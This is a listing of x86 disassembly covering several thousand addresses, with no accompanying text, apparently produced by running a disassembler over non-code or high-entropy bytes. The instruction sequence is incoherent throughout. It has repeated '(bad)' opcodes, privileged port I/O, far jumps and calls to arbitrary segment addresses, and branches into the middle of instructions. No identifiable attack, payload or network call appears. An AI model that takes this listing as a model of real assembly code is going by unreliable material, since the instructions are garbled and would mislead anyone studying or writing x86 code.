  423611:	and    bh,BYTE PTR [esp+eiz*8-0x3f]
  423615:	enter  0xba1d,0xb6
  423619:	xlat   BYTE PTR ds:[ebx]
  42361a:	fldenv [ecx+0x47bdeb77]
  423620:	dec    edi
  423621:	xchg   edi,eax
  423622:	mov    esi,0xf2d39938
  423627:	cmp    al,0x34
  423629:	rcl    BYTE PTR [esi+edx*4+0x332b6357],0xde
  423631:	bnd jns 0x4236a3
  423634:	mov    al,0x26
  423636:	mov    ch,0x52
  423638:	mov    al,ds:0x9cd74551
  42363d:	std    
  42363e:	mov    eax,0xf2df7c23
  423643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423644:	xchg   BYTE PTR [ecx],al
  423646:	in     al,dx
  423647:	push   ecx
  423648:	ds jbe 0x42360b
  42364b:	cdq    
  42364c:	scas   al,BYTE PTR es:[edi]
  42364d:	shl    BYTE PTR [ebp+ebx*4-0x3c],cl
  423651:	lds    ebx,FWORD PTR [edi+0x89cb992]
  423657:	sar    BYTE PTR [ebp-0x3f45a016],cl
  42365d:	lahf   
  42365e:	mov    dh,0xf8
  423660:	and    al,0xc9
  423662:	outs   dx,DWORD PTR es:[esi]
  423664:	inc    eax
  423665:	aas    
  423666:	push   ss
  423667:	out    dx,al
  423668:	ret    
  423669:	ret    
  42366a:	adc    cl,BYTE PTR ds:0x113ae770
  423670:	add    eax,0xd674f96f
  423675:	mov    edx,0x17c2d072
  42367a:	add    BYTE PTR [esi+eiz*1-0x75],ah
  42367e:	mov    al,0xae
  423680:	loope  0x42365f
  423682:	sub    ecx,edi
  423684:	iret   
  423685:	(bad)  
  423686:	jbe    0x423657
  423688:	add    BYTE PTR [eax],al
  42368a:	pop    eax
  42368b:	pop    ecx
  42368c:	dec    ebx
  42368d:	push   ebp
  42368e:	dec    ebx
  42368f:	push   edi
  423690:	pop    esi
  423691:	pop    ebp
  423692:	mov    ebx,0x75a42923
  423697:	ins    BYTE PTR es:[edi],dx
  423698:	pop    ebp
  423699:	(bad)  
  42369a:	adc    al,ch
  42369c:	add    DWORD PTR [eax],eax
  42369e:	xchg   BYTE PTR [esi],al
  4236a0:	add    BYTE PTR [eax],al
  4236a2:	fst    DWORD PTR [edi+0x103e9f1f]
  4236a8:	jns    0x42367a
  4236aa:	in     al,dx
  4236ab:	and    esp,ebx
  4236ad:	mov    dh,0x1a
  4236af:	retf   0xce0f
  4236b2:	dec    ebx
  4236b3:	ja     0x42366c
  4236b5:	xchg   ebp,eax
  4236b6:	xchg   ebx,eax
  4236b7:	imul   esi,DWORD PTR [edi-0x29],0xffffff96
  4236bb:	adc    BYTE PTR [ebp-0x3a44194c],bl
  4236c1:	in     eax,dx
  4236c2:	pop    ebx
  4236c3:	test   BYTE PTR [edx],0x8f
  4236c6:	mov    DWORD PTR [ebx-0x483db85d],ebp
  4236cc:	xor    BYTE PTR [ecx],0xb0
  4236cf:	cdq    
  4236d0:	mov    eax,ds:0xe2b6f092
  4236d5:	mov    edi,0x5d18321c
  4236da:	test   al,0x9b
  4236dc:	push   ss
  4236dd:	out    dx,al
  4236de:	mov    BYTE PTR [edx],al
  4236e0:	mov    DWORD PTR [esi+edx*2-0x18],ecx
  4236e4:	adc    eax,0x2ae2f7f3
  4236e9:	inc    esi
  4236ea:	out    0x7,eax
  4236ec:	fst    QWORD PTR [ebp+0x334b3987]
  4236f2:	outs   dx,DWORD PTR ds:[esi]
  4236f3:	shr    ecx,cl
  4236f5:	adc    ah,BYTE PTR [ebx]
  4236f7:	fisubr WORD PTR [ecx]
  4236f9:	pop    es
  4236fa:	dec    ebx
  4236fb:	pcmpeqb mm5,mm1
  4236fe:	not    BYTE PTR [ebx-0x31c44a1]
  423704:	sar    DWORD PTR [edx+ecx*2+0x27],0x8e
  423709:	lock sub DWORD PTR [edi+0x31],eax
  42370d:	jmp    FWORD PTR [ecx-0x41]
  423710:	outs   dx,DWORD PTR ds:[esi]
  423711:	mov    esp,0x2e8f2b55
  423716:	aad    0x82
  423718:	mov    esp,0xd0586562
  42371d:	or     eax,0xbd79ec2c
  423722:	stos   BYTE PTR es:[edi],al
  423723:	xchg   edx,eax
  423724:	sbb    cl,BYTE PTR [ebp+0x79765134]
  42372a:	retf   
  42372b:	pop    ebx
  42372c:	data16 fld QWORD PTR [edi-0x1bf60eb3]
  423733:	mov    WORD PTR [esi],es
  423735:	(bad)  
  423736:	mov    bl,0x8
  423738:	pop    es
  423739:	sub    DWORD PTR [ebx-0x41e41383],0x64
  423740:	dec    eax
  423741:	and    al,0xd3
  423743:	push   ebp
  423744:	mov    edx,ecx
  423746:	xor    eax,0x1be341a3
  42374b:	dec    eax
  42374c:	ins    DWORD PTR es:[edi],dx
  42374d:	(bad)  
  42374f:	dec    edi
  423750:	sti    
  423751:	dec    esi
  423752:	sub    eax,0x9f8fb02
  423757:	arpl   WORD PTR [edi],bp
  423759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42375a:	ret    
  42375b:	sub    al,0x3d
  42375d:	rcr    BYTE PTR [eax+0x6e],0xe9
  423761:	dec    eax
  423762:	out    0xb7,eax
  423764:	dec    edx
  423765:	and    cl,BYTE PTR [esi]
  423767:	adc    dl,BYTE PTR [eax]
  423769:	das    
  42376a:	xchg   ch,bl
  42376c:	les    edx,FWORD PTR [ebp+0x577d2dde]
  423772:	sahf   
  423773:	jmp    0x423707
  423775:	std    
  423776:	icebp  
  423777:	cdq    
  423778:	mov    bl,0xd
  42377a:	jae    0x4237cf
  42377c:	inc    edx
  42377d:	repz daa 
  42377f:	mov    esi,ebp
  423781:	dec    edx
  423782:	cli    
  423783:	push   edx
  423784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423785:	pushf  
  423786:	(bad)  
  423788:	(bad)  
  423789:	sbb    al,0x4f
  42378b:	cmp    esp,ebp
  42378d:	jmp    0x9554:0x73df81d5
  423794:	cmp    DWORD PTR [edx+0x61ffde1],0x51
  42379b:	pop    ebx
  42379c:	mov    DWORD PTR [edx-0x177aaef9],edx
  4237a2:	and    eax,0x2d1b4040
  4237a7:	jecxz  0x423741
  4237a9:	pusha  
  4237aa:	pop    ecx
  4237ab:	imul   ecx,DWORD PTR [edi-0x16],0x10
  4237af:	sub    DWORD PTR [edi+0x171a0d1c],0x52e20f59
  4237b9:	or     ah,BYTE PTR [edx+edx*4-0x40b69201]
  4237c0:	mov    dl,bh
  4237c2:	out    dx,eax
  4237c3:	push   ss
  4237c4:	dec    ebp
  4237c5:	xor    ch,bh
  4237c7:	add    DWORD PTR [edi-0x5a],ecx
  4237ca:	mov    bl,0xc3
  4237cc:	cmp    DWORD PTR [ebp+0x42279d7d],0x5b
  4237d3:	sti    
  4237d4:	outs   dx,DWORD PTR ds:[esi]
  4237d5:	mov    ecx,0x92995acb
  4237da:	pop    ds
  4237db:	adc    al,0x44
  4237dd:	mov    cl,0x3a
  4237df:	jns    0x4237c0
  4237e1:	sahf   
  4237e2:	in     al,dx
  4237e3:	ss int 0x1
  4237e6:	pusha  
  4237e7:	xchg   esi,eax
  4237e8:	mov    BYTE PTR [eax+0x5c6ea334],dh
  4237ee:	push   edx
  4237ef:	xor    BYTE PTR [ebx+0x49f0b2d6],bl
  4237f5:	pop    ecx
  4237f6:	push   ebx
  4237f7:	das    
  4237f8:	in     al,0x96
  4237fa:	fwait
  4237fb:	mov    esp,0x95cc4aef
  423800:	xor    eax,0xf96ca39f
  423805:	ins    DWORD PTR es:[edi],dx
  423806:	push   edi
  423807:	mov    al,ah
  423809:	dec    edx
  42380a:	fdiv   QWORD PTR ss:[eax+0x170f666c]
  423811:	xor    ah,bl
  423813:	jmp    0x7ebed1a4
  423818:	rol    ch,cl
  42381a:	sub    bl,al
  42381c:	mov    ch,0x35
  42381e:	test   BYTE PTR [edx-0x56],dh
  423821:	push   esi
  423822:	xchg   ecx,eax
  423823:	les    ebp,FWORD PTR [ecx+edx*4]
  423826:	and    DWORD PTR [ebx],eax
  423828:	mov    eax,edx
  42382a:	hlt    
  42382b:	ss jne 0x4237e9
  42382e:	syscall 
  423830:	xor    al,0x21
  423832:	add    dh,cl
  423834:	xchg   ecx,eax
  423835:	xor    eax,0x9c38f802
  42383a:	adc    ch,BYTE PTR [ebx+0x0]
  42383d:	out    0xea,eax
  42383f:	cwde   
  423840:	in     al,dx
  423841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423842:	sbb    cl,BYTE PTR [edi]
  423844:	ins    DWORD PTR es:[edi],dx
  423845:	pop    eax
  423846:	ss sub eax,0xb960b4a6
  42384c:	fsubr  st(6),st
  42384e:	push   ecx
  42384f:	std    
  423850:	fild   WORD PTR [ebp-0x26b24979]
  423856:	dec    ebp
  423857:	adc    BYTE PTR [edi-0x1],ch
  42385a:	pop    ecx
  42385b:	aas    
  42385c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42385d:	push   ebx
  42385e:	in     eax,0x59
  423860:	mov    ds:0x530f872e,al
  423865:	fld    DWORD PTR [edi-0x75]
  423868:	adc    DWORD PTR [ecx+0x5e],ebp
  42386b:	add    al,0x83
  42386d:	ret    
  42386e:	sti    
  42386f:	lahf   
  423870:	xlat   BYTE PTR ds:[ebx]
  423871:	or     bl,BYTE PTR ds:[edi-0x3eea5d9b]
  423878:	add    BYTE PTR [ebx+0x55],al
  42387b:	pushf  
  42387c:	or     DWORD PTR ds:0x11a780b8,eax
  423882:	jp     0x4238bc
  423884:	xor    al,0xfb
  423886:	sar    DWORD PTR [eax+0x6a],cl
  423889:	outs   dx,DWORD PTR ds:[esi]
  42388a:	or     eax,0xe15fe30a
  42388f:	or     BYTE PTR [esi],dl
  423891:	in     al,dx
  423892:	lods   al,BYTE PTR ds:[esi]
  423893:	mov    bh,0x6d
  423895:	push   edi
  423896:	mov    esp,0x24d28124
  42389b:	inc    ebx
  42389c:	fucom  st(3)
  42389e:	mov    ebx,0x685a8c52
  4238a3:	lds    eax,FWORD PTR [eax-0x78a15783]
  4238a9:	hlt    
  4238aa:	sub    BYTE PTR [ecx-0x71],bh
  4238ad:	xchg   esi,eax
  4238ae:	cmp    al,0xff
  4238b0:	jecxz  0x4238cc
  4238b2:	repz pushf 
  4238b4:	sbb    BYTE PTR [ecx-0x5b3ccc4d],dh
  4238ba:	dec    BYTE PTR [edi]
  4238bc:	not    eax
  4238be:	and    esp,edi
  4238c0:	scas   eax,DWORD PTR es:[edi]
  4238c1:	xor    BYTE PTR [edx],ah
  4238c3:	push   ds
  4238c4:	inc    di
  4238c6:	and    dh,dh
  4238c8:	xchg   BYTE PTR [ecx+0x28037d56],ah
  4238ce:	das    
  4238cf:	mov    edi,0xea8c331d
  4238d4:	cmp    eax,0x6b1dc0d0
  4238d9:	test   eax,0xf9f9457a
  4238de:	jae    0x4238d0
  4238e0:	int    0x4e
  4238e2:	leave  
  4238e3:	in     al,dx
  4238e4:	rcl    BYTE PTR [ebx],1
  4238e6:	fisubr WORD PTR [ebx+0x6f]
  4238e9:	cmp    eax,0x4fcdb1f4
  4238ee:	idiv   BYTE PTR [ebx+0x3f]
  4238f1:	push   0xe2447345
  4238f6:	les    esp,FWORD PTR [ebp+0x6003c465]
  4238fc:	cs jecxz 0x423974
  4238ff:	xchg   ebx,eax
  423900:	dec    eax
  423901:	add    al,0x4f
  423903:	xchg   edi,eax
  423904:	mov    esp,0x70264265
  423909:	push   0xffffffa4
  42390b:	push   ebx
  42390c:	fs ret 
  42390e:	jbe    0x42394a
  423910:	xchg   ebx,eax
  423911:	out    dx,eax
  423912:	icebp  
  423913:	imul   ecx
  423915:	inc    ebp
  423916:	data16 adc BYTE PTR [edx+eiz*4+0x43],al
  42391b:	jbe    0x4238c4
  42391d:	push   edx
  42391e:	mov    ebp,0x1f664856
  423923:	ss retf 
  423925:	push   ebp
  423926:	adc    dl,BYTE PTR [edx+0x3c049340]
  42392c:	mov    dh,0xb
  42392e:	mov    eax,ds:0xebe171ae
  423933:	outs   dx,BYTE PTR ds:[esi]
  423934:	ins    DWORD PTR es:[edi],dx
  423935:	vmptrst QWORD PTR ds:0x6b7c0c7
  42393c:	cwde   
  42393d:	ds jbe 0x423996
  423940:	stc    
  423941:	or     esi,DWORD PTR [eax+0x6e]
  423944:	lahf   
  423945:	dec    esi
  423946:	mov    bl,0x5f
  423948:	nop
  423949:	imul   ebp,DWORD PTR [esi*1+0x30efb9e8],0xe60fe09
  423954:	jle    0x42392b
  423956:	fld    TBYTE PTR [ebx-0x30cdf9a1]
  42395c:	ds or  eax,0xed2200c2
  423962:	test   bl,cl
  423964:	cmp    BYTE PTR [edx],0xd3
  423967:	mov    dh,0x60
  423969:	jbe    0x423938
  42396b:	das    
  42396c:	sub    BYTE PTR [ebp+ebx*1+0x60ee7a63],ah
  423973:	loop   0x4239c0
  423975:	cdq    
  423976:	aaa    
  423977:	fsub   st(6),st
  423979:	rcl    DWORD PTR es:[ebx],cl
  42397c:	(bad)  
  42397d:	icebp  
  42397e:	into   
  42397f:	sbb    ebp,ebp
  423981:	xlat   BYTE PTR ds:[ebx]
  423982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423983:	mov    eax,ds:0xa837adeb
  423988:	popf   
  423989:	mov    DWORD PTR [ecx+0x1f],ebp
  42398c:	test   BYTE PTR [edx+eax*8+0x73804c06],0xb8
  423994:	idiv   BYTE PTR [esi+0x2fbb7e9b]
  42399a:	xchg   esp,eax
  42399b:	jbe    0x42393a
  42399d:	push   ss
  42399e:	mov    esi,DWORD PTR [ebx-0x61]
  4239a1:	push   ss
  4239a2:	or     al,0x5f
  4239a4:	es loope 0x423949
  4239a7:	dec    edi
  4239a8:	sbb    ebp,DWORD PTR [edx-0xd2c3fe4]
  4239ae:	add    BYTE PTR [edi+edi*1-0x200aac2d],dh
  4239b5:	jo     0x423a04
  4239b7:	mov    ecx,0xd282629f
  4239bc:	sub    al,BYTE PTR [ebp+0x7a1dcf93]
  4239c2:	fsub   DWORD PTR [ebp+esi*2+0x6321987d]
  4239c9:	xchg   BYTE PTR [esi+eax*1+0x77981a31],ah
  4239d0:	xchg   ebx,eax
  4239d1:	mov    ch,BYTE PTR [esi+0x1ddde725]
  4239d7:	ds iret 
  4239d9:	cmp    al,0x20
  4239db:	(bad)  
  4239dc:	cli    
  4239dd:	jp     0x42399c
  4239df:	xchg   ecx,eax
  4239e0:	in     eax,0xb
  4239e2:	lods   eax,DWORD PTR ds:[esi]
  4239e3:	push   ebp
  4239e4:	fimul  DWORD PTR [edi-0x19]
  4239e7:	xchg   ecx,eax
  4239e8:	sbb    eax,0xf88a27f9
  4239ed:	inc    ebp
  4239ee:	push   ecx
  4239ef:	leave  
  4239f0:	add    eax,0x3a6e03e8
  4239f5:	call   0x8bfd76fa
  4239fa:	pop    es
  4239fb:	pop    edi
  4239fc:	inc    eax
  4239fd:	retf   
  4239fe:	push   ebp
  4239ff:	dec    ebx
  423a00:	mov    bh,0x65
  423a02:	mov    esi,0x37ba0ab6
  423a07:	fild   DWORD PTR [ebx]
  423a09:	xchg   edi,eax
  423a0a:	mov    ch,0xe9
  423a0c:	sub    BYTE PTR [ebp-0x21],bl
  423a0f:	not    DWORD PTR [ebp-0x36]
  423a12:	or     BYTE PTR [eax+0x301de275],dh
  423a18:	and    esi,ecx
  423a1a:	dec    esi
  423a1b:	cs pop ss
  423a1d:	sub    dh,BYTE PTR [edx]
  423a1f:	jne    0x4239f6
  423a21:	xor    al,0x5
  423a23:	xor    dl,dl
  423a25:	out    0xe4,eax
  423a27:	push   0x29
  423a29:	cld    
  423a2a:	lods   al,BYTE PTR ds:[esi]
  423a2b:	mov    bh,0x4c
  423a2d:	cmp    eax,0xbda54cb0
  423a32:	jp     0x423a0a
  423a34:	rol    ch,cl
  423a36:	add    eax,0xbab05eb6
  423a3b:	push   eax
  423a3c:	sub    al,BYTE PTR [ecx-0x679caa75]
  423a42:	push   0xffffff96
  423a44:	mul    BYTE PTR [edx+0x51]
  423a47:	mov    esp,0xfc782dd4
  423a4c:	das    
  423a4d:	cld    
  423a4e:	retf   
  423a4f:	ffreep st(5)
  423a51:	jmp    0x939a:0x8f23c140
  423a58:	xchg   edx,eax
  423a59:	enter  0x2ceb,0x1b
  423a5d:	dec    eax
  423a5e:	sbb    BYTE PTR [ecx+0x3c17c8c9],dl
  423a64:	mov    dh,0xca
  423a66:	xacquire xchg BYTE PTR [esi],dl
  423a69:	cld    
  423a6a:	and    BYTE PTR [ecx],ch
  423a6c:	ja     0x423aa2
  423a6e:	call   0x7c3ba874
  423a73:	mov    ds:0xf7257225,al
  423a78:	(bad)  
  423a79:	neg    DWORD PTR [ebx-0x6]
  423a7c:	xor    eax,0x7fff4fc3
  423a81:	test   BYTE PTR [edi+edi*4+0x3f],ah
  423a85:	in     al,dx
  423a86:	int3   
  423a87:	mov    ds:0x2f3b0d38,al
  423a8c:	push   ebp
  423a8d:	(bad)  
  423a8e:	or     esp,DWORD PTR [ebx-0x1c]
  423a91:	jns    0x423aa4
  423a93:	aaa    
  423a94:	inc    edi
  423a95:	mov    al,BYTE PTR ds:[ecx+0x5d2a4906]
  423a9c:	outs   dx,BYTE PTR ds:[esi]
  423a9d:	adc    eax,ebp
  423a9f:	push   cs
  423aa0:	es xchg ebp,eax
  423aa2:	in     eax,0xb8
  423aa4:	shr    DWORD PTR [esi+eiz*2-0x60],0x8e
  423aa9:	(bad)  
  423aaa:	inc    esi
  423aab:	les    edi,FWORD PTR [esi+0x623ca49a]
  423ab1:	xchg   edi,eax
  423ab2:	mov    al,0x20
  423ab4:	out    dx,al
  423ab5:	rol    bh,0x61
  423ab8:	sub    edi,DWORD PTR [ebp-0x3c708a0]
  423abe:	xor    BYTE PTR [ecx],bl
  423ac0:	adc    al,0xf5
  423ac2:	jge    0x423b17
  423ac4:	(bad)  
  423ac5:	enter  0xccdd,0xa5
  423ac9:	push   0x1430db61
  423ace:	jnp    0x423aa5
  423ad0:	xor    BYTE PTR [ebp-0x5897ce94],cl
  423ad6:	adc    ebx,eax
  423ad8:	pop    esp
  423ad9:	xor    DWORD PTR [edx+0x1f5dd82e],edi
  423adf:	in     al,0xda
  423ae1:	rcl    BYTE PTR [esi],0x33
  423ae4:	cmc    
  423ae5:	stos   DWORD PTR es:[edi],eax
  423ae6:	xchg   esp,eax
  423ae7:	push   0xd04e501
  423aec:	mov    ebx,0x7e49dba7
  423af1:	rcl    BYTE PTR [edi+0x56],0x16
  423af5:	(bad)  
  423af6:	dec    DWORD PTR [edi-0x57df010e]
  423afc:	dec    ebp
  423afd:	adc    BYTE PTR [ebp+0x281789fb],ch
  423b03:	into   
  423b04:	mov    eax,0xfbb40390
  423b09:	jnp    0x423b30
  423b0b:	rcr    BYTE PTR [esp+edx*4-0x51],cl
  423b0f:	push   edi
  423b10:	outs   dx,DWORD PTR ds:[esi]
  423b11:	rcl    ah,0xb5
  423b14:	dec    edx
  423b15:	sub    ebp,DWORD PTR [edx]
  423b17:	ror    DWORD PTR [edx-0x80],1
  423b1a:	jle    0x423b07
  423b1c:	sbb    eax,0x166d6f1c
  423b21:	outs   dx,DWORD PTR ds:[esi]
  423b22:	fstp   QWORD PTR [ebp-0x5234891f]
  423b28:	loopne 0x423b50
  423b2a:	sbb    ch,BYTE PTR [edx+0x48903797]
  423b30:	pushf  
  423b31:	fs sub edi,eax
  423b34:	add    eax,0x68885061
  423b39:	hlt    
  423b3a:	fst    QWORD PTR [eax]
  423b3c:	sbb    BYTE PTR [eax-0x45],dh
  423b3f:	cmp    ah,BYTE PTR [edx-0x6af5aecf]
  423b45:	sar    DWORD PTR [ebp+0x12c6ca18],cl
  423b4b:	sbb    al,0x43
  423b4d:	sub    eax,0xf2040fb4
  423b52:	inc    ebx
  423b53:	loop   0x423b2f
  423b55:	loopne 0x423b10
  423b57:	aaa    
  423b58:	sub    bl,BYTE PTR [eax+0x5d28e7e7]
  423b5e:	imul   edi,DWORD PTR [esp+eax*1],0xffffffda
  423b62:	jno    0x423b8c
  423b64:	mov    WORD PTR [ecx-0x61484cee],es
  423b6a:	loopne 0x423b3a
  423b6c:	mov    al,ds:0x5177b9fe
  423b71:	jmp    0x85c8:0x5f00dfd5
  423b78:	call   0xb8f87d1
  423b7d:	mov    cl,ch
  423b7f:	mov    bl,0x3a
  423b81:	push   edi
  423b82:	or     BYTE PTR [ebp+0x6c],dh
  423b85:	rcr    esp,0xee
  423b88:	xor    BYTE PTR [esi],ah
  423b8a:	and    eax,0xeecdd1d7
  423b8f:	cmp    dh,bh
  423b91:	into   
  423b92:	pop    ebx
  423b93:	mov    cl,0x1c
  423b95:	jae    0x423b99
  423b97:	push   ebx
  423b98:	popf   
  423b99:	dec    edx
  423b9a:	mov    edi,0x4f51855d
  423b9f:	lods   al,BYTE PTR ds:[esi]
  423ba0:	inc    eax
  423ba1:	sub    edx,DWORD PTR [ecx-0x2f]
  423ba4:	pop    esi
  423ba5:	ret    
  423ba6:	imul   eax,DWORD PTR [ecx],0x6f69c7fc
  423bac:	add    esp,DWORD PTR [ecx]
  423bae:	(bad)  
  423baf:	fbld   TBYTE PTR [ecx]
  423bb1:	fst    DWORD PTR [edi-0x65]
  423bb4:	shl    DWORD PTR gs:[eax],0x61
  423bb8:	ret    0x1224
  423bbb:	pop    esp
  423bbc:	cli    
  423bbd:	xchg   ebx,eax
  423bbe:	mov    esi,0x37d574b1
  423bc3:	cdq    
  423bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423bc5:	dec    ebp
  423bc6:	add    eax,0xfe6a3ff0
  423bcb:	test   BYTE PTR [edi+0x71bcc721],dh
  423bd1:	test   DWORD PTR [ecx-0x5321c0d9],0xd1811061
  423bdb:	fbstp  TBYTE PTR [ecx]
  423bdd:	cld    
  423bde:	dec    esi
  423bdf:	(bad)  
  423be1:	inc    esi
  423be2:	mov    dh,BYTE PTR [ebx+0x2d]
  423be5:	cmp    bl,ah
  423be7:	ret    
  423be8:	cmp    DWORD PTR [edi-0x76028e71],0xffffffd7
  423bef:	mov    al,ds:0x82df556c
  423bf4:	lock mov BYTE PTR [edi],ch
  423bf7:	lods   al,BYTE PTR ds:[esi]
  423bf8:	(bad)  
  423bf9:	aad    0x57
  423bfb:	push   cs
  423bfc:	mov    esp,0xbbc4e27b
  423c01:	and    BYTE PTR [ebx],0x3a
  423c04:	xor    BYTE PTR [edi],bh
  423c06:	ja     0x423bae
  423c08:	hlt    
  423c09:	mov    ds:0x3b9f3ae6,eax
  423c0e:	mov    ebx,0xb974fe66
  423c13:	scas   eax,DWORD PTR es:[edi]
  423c14:	nop
  423c15:	lock div BYTE PTR [ebx-0x518eb1c]
  423c1c:	(bad)  [edx-0x5edbeefc]
  423c22:	rcr    BYTE PTR [edi+0x43],cl
  423c25:	and    BYTE PTR [esi-0x21fe90c3],dl
  423c2b:	mov    ecx,eax
  423c2d:	aam    0xd
  423c2f:	mov    BYTE PTR [ebx],bh
  423c31:	jge    0x423c67
  423c33:	adc    eax,0x25e402a
  423c39:	daa    
  423c3a:	xchg   ebp,eax
  423c3b:	(bad)  
  423c3c:	xlat   BYTE PTR ds:[ebx]
  423c3d:	and    ah,bh
  423c3f:	or     ah,dl
  423c41:	in     eax,dx
  423c42:	xor    DWORD PTR [eax+0x75],ebx
  423c45:	sub    eax,0xc80604ec
  423c4a:	jae    0x423c94
  423c4c:	aas    
  423c4d:	cmp    al,0x80
  423c4f:	dec    ebx
  423c50:	push   ecx
  423c51:	push   edi
  423c52:	and    DWORD PTR [ecx],ecx
  423c54:	sub    ebp,DWORD PTR [eax]
  423c56:	push   ds
  423c57:	mov    dh,0xa3
  423c59:	ror    DWORD PTR gs:[edi+0x6ad40bda],0x62
  423c61:	mov    esp,0x8e8ea132
  423c66:	out    dx,al
  423c67:	sbb    ebx,DWORD PTR [eax]
  423c69:	cmp    ch,ah
  423c6b:	icebp  
  423c6c:	mov    al,0x4f
  423c6e:	cmp    al,0xa6
  423c70:	enter  0x92f6,0x93
  423c74:	mov    dl,0x1e
  423c76:	pop    ecx
  423c77:	ins    DWORD PTR es:[edi],dx
  423c78:	mov    ds:0x6b5e2af2,eax
  423c7d:	test   al,0x7a
  423c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c80:	add    DWORD PTR [edx],ebp
  423c82:	add    DWORD PTR [edx],edx
  423c84:	aaa    
  423c85:	into   
  423c86:	sar    ah,cl
  423c88:	cmp    eax,0x55dc546d
  423c8d:	outs   dx,BYTE PTR ds:[esi]
  423c8e:	in     eax,0xaf
  423c90:	mov    cl,0x80
  423c92:	jo     0x423cac
  423c94:	mov    ebx,0x3887347c
  423c99:	push   ds
  423c9a:	pop    ebx
  423c9b:	call   0x6cec:0x73f44c17
  423ca2:	stc    
  423ca3:	cli    
  423ca4:	xor    ch,BYTE PTR [eax-0x2e]
  423ca7:	ret    
  423ca8:	jbe    0x423cb0
  423caa:	loop   0x423cb5
  423cac:	scas   al,BYTE PTR es:[edi]
  423cad:	xchg   esp,eax
  423cae:	inc    ebx
  423caf:	xor    DWORD PTR [ebx],esp
  423cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cb2:	inc    esp
  423cb3:	imul   BYTE PTR [esi-0x5]
  423cb6:	inc    edi
  423cb7:	pop    eax
  423cb8:	inc    esp
  423cb9:	in     al,0x4e
  423cbb:	sub    eax,0xa804cb22
  423cc0:	push   ecx
  423cc1:	addr16 gs leave 
  423cc4:	fist   WORD PTR ds:0xbb8f4ccd
  423cca:	adc    dh,BYTE PTR [eax+eax*4+0x58]
  423cce:	sbb    al,0x5
  423cd0:	fsubr  DWORD PTR [edx-0x4]
  423cd3:	arpl   WORD PTR ds:0xc786f19,bx
  423cd9:	lods   eax,DWORD PTR ds:[esi]
  423cda:	outs   dx,BYTE PTR ds:[esi]
  423cdb:	cdq    
  423cdc:	into   
  423cdd:	arpl   WORD PTR [esi],bx
  423cdf:	jle    0x423cec
  423ce1:	(bad)  
  423ce2:	mov    edx,0xc1f58fc6
  423ce7:	xlat   BYTE PTR ds:[ebx]
  423ce8:	outs   dx,DWORD PTR ds:[esi]
  423ce9:	call   0xd5d00a72
  423cee:	mov    bh,0xab
  423cf0:	(bad)  
  423cf1:	push   cs
  423cf2:	cli    
  423cf3:	es push eax
  423cf5:	mov    BYTE PTR [ebx-0x18eb2abe],ah
  423cfb:	sub    eax,0x678a398e
  423d00:	fsubr  QWORD PTR [ebx+0x74d6174a]
  423d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d07:	ins    DWORD PTR es:[edi],dx
  423d08:	add    eax,0xd92fabad
  423d0d:	xchg   BYTE PTR [eax-0x4a849b72],cl
  423d13:	nop
  423d14:	add    esp,DWORD PTR [edx-0x19]
  423d17:	xchg   ebp,eax
  423d18:	cmc    
  423d19:	mov    dl,0xd3
  423d1b:	xlat   BYTE PTR ds:[ebx]
  423d1c:	loop   0x423cbe
  423d1e:	sub    bl,BYTE PTR [ebx+0x6f]
  423d21:	mov    esi,0x3a7e6463
  423d26:	popa   
  423d27:	push   ecx
  423d28:	add    BYTE PTR [eax],al
  423d2a:	inc    esp
  423d2b:	push   edx
  423d2c:	push   edi
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax-0x4c600192],ah
  423d38:	push   esi
  423d39:	xchg   edx,eax
  423d3a:	cwde   
  423d3b:	retf   
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	xchg   BYTE PTR [esi],al
  423d40:	add    BYTE PTR [eax],al
  423d42:	inc    BYTE PTR [eax-0x94b9366]
  423d48:	and    esp,ecx
  423d4a:	fbstp  TBYTE PTR [edx-0x3b]
  423d4d:	or     DWORD PTR [edi-0x6a772cac],0x3a
  423d54:	mov    eax,ds:0x859e0cb7
  423d59:	pop    esi
  423d5a:	adc    ah,BYTE PTR [eax+0x3cb87a35]
  423d60:	jne    0x2087adcf
  423d66:	stos   DWORD PTR es:[edi],eax
  423d67:	inc    ebp
  423d68:	cmp    BYTE PTR [eax],bl
  423d6a:	or     ebx,ecx
  423d6c:	xor    BYTE PTR [edi+0x5c34fd41],dh
  423d72:	inc    esp
  423d73:	fistp  WORD PTR [ebp-0x53]
  423d76:	add    edi,esp
  423d78:	pop    ecx
  423d79:	push   0x14
  423d7b:	hlt    
  423d7c:	ds push cs
  423d7e:	fild   DWORD PTR [ecx-0x42]
  423d81:	outs   dx,DWORD PTR ds:[esi]
  423d82:	out    0xac,eax
  423d84:	jg     0x423d24
  423d86:	fs sub eax,0x72c20b6b
  423d8c:	sar    BYTE PTR ds:0x5b01653f,1
  423d92:	xor    al,BYTE PTR ds:0xa749012b
  423d98:	fadd   QWORD PTR [ecx-0x3ca47e3e]
  423d9e:	imul   DWORD PTR [ebp-0x5d]
  423da1:	xchg   edi,eax
  423da2:	nop
  423da3:	rcr    DWORD PTR [ecx-0x5090b83e],0xa2
  423daa:	push   edi
  423dab:	addr16 repz ret 
  423dae:	mov    al,0x3a
  423db0:	fcomp  st(4)
  423db2:	pop    ss
  423db3:	jo     0x423e00
  423db5:	inc    ecx
  423db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423db7:	bound  esp,QWORD PTR [esi+edx*1+0x570d2b37]
  423dbe:	fwait
  423dbf:	js     0x423db4
  423dc1:	pop    ebp
  423dc2:	cld    
  423dc3:	retf   
  423dc4:	stc    
  423dc5:	sahf   
  423dc6:	lahf   
  423dc7:	cmp    dh,BYTE PTR [edx+edx*8-0x7c7f2040]
  423dce:	push   ecx
  423dcf:	add    BYTE PTR [ecx+eiz*1+0x44a4cdbd],0x17
  423dd7:	fist   WORD PTR [edx]
